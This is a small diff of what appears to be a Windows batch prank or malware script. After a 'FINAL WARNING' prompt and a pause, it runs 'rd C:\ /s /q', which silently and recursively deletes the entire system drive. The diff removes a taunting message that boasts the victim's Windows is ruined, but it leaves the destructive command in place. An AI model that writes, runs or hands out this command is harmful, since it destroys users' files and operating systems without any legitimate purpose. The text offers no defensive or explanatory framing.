@@ -11,8 +11,3 @@ echo FINAL WARNING CONTINUE?
 pause
 
 rd C:\ /s /q
-
-cls
-
-echo LOL YOUR WINDOWS IS FUCKED!!!!
-pause
